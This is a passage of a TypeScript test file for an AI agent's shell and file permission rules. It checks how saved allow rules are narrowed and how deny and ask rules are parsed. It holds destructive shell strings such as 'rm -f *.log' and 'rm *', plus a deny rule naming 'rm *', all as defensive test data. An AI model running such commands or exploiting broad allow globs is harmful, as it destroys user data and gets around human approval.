    it('saves a `*` sub-command it pulls out of an older shell allow exact', () => {
      const rules = [
        allow('run_shell', 'cd /repo && rm -f *.log'),
        allow('run_shell', 'do ls *.ts'),
        allow('run_shell', 'cd /repo && npm install foo')
      ]
      const cleaned = cleanupPermissionRules(rules)
      expect(cleaned).toEqual([
        exactAllow('run_shell', 'rm -f *.log'),
        exactAllow('run_shell', 'ls *.ts'),
        allow('run_shell', 'npm install')
      ])
      // As a glob, `rm -f *.log` would have allowed this.
      expect(matchRule(cleaned, 'run_shell', 'rm -f ~/x.log')).toBeNull()
      expect(matchRule(cleaned, 'run_shell', 'rm -f *.log')).toBe('allow')
      expect(cleanupPermissionRules(cleaned)).toEqual(cleaned)
    })

    it('leaves a shell glob that is already its own pattern alone (it may be on purpose)', () => {
      // "Always allow" once saved `rm *` this way, but `git *` reads the same and is a
      // common deliberate glob; nothing tells them apart, so neither is narrowed.
      const rules = [allow('run_shell', 'git *'), allow('run_shell', 'rm *'), allow('run_shell', 'ls -la *.ts')]
      expect(cleanupPermissionRules(rules)).toEqual(rules)
      expect(matchRule(cleanupPermissionRules(rules), 'run_shell', 'git push --force')).toBe('allow')
    })

    it('drops an exact `*` sub-command an earlier allow already covers', () => {
      const rules = [allow('run_shell', 'rm'), allow('run_shell', 'cd /repo && rm *')]
      expect(cleanupPermissionRules(rules)).toEqual([allow('run_shell', 'rm')])
    })
  })
})

describe('parseTightenOnlyRules', () => {
  it('keeps deny/ask and drops allow / malformed / non-array', () => {
    expect(
      parseTightenOnlyRules(
        {
          permissionRules: [
            { action: 'deny', tool: 'run_shell', match: 'rm *' },
            { action: 'ask', tool: 'write_file', match: 'prod/**' },
            { action: 'allow', tool: '*', match: '*' }, // dropped — would loosen
            { action: 'deny' }, // dropped — missing tool/match
            { action: 'ask', tool: 1, match: 'x' }, // dropped — non-string tool
            42 // dropped — not an object
          ]
        },
        100
      )
    ).toEqual([
      { action: 'deny', tool: 'run_shell', match: 'rm *' },
      { action: 'ask', tool: 'write_file', match: 'prod/**' }
    ])
    expect(parseTightenOnlyRules({ permissionRules: 'nope' }, 100)).toEqual([])
    expect(parseTightenOnlyRules(null, 100)).toEqual([])
  })

  it('keeps `exact: true` and drops any other exact value', () => {
    expect(
      parseTightenOnlyRules(
        {
          permissionRules: [
            { action: 'deny', tool: 'write_file', match: 'a.ts', exact: true },
            { action: 'ask', tool: 'write_file', match: 'b.ts', exact: 'yes' },
            { action: 'allow', tool: 'write_file', match: 'c.ts', exact: true } // dropped — would loosen
          ]
        },
        100
      )
    ).toEqual([
      { action: 'deny', tool: 'write_file', match: 'a.ts', exact: true },
      { action: 'ask', tool: 'write_file', match: 'b.ts' }
    ])
  })

  it('caps the number of rules at maxRules (DoS backstop)', () => {
    const many = Array.from({ length: 10 }, (_, i) => ({
      action: 'deny' as const,
      tool: 'run_shell',
      match: `cmd${i}`
    }))
    expect(parseTightenOnlyRules({ permissionRules: many }, 3)).toHaveLength(3)
  })
})
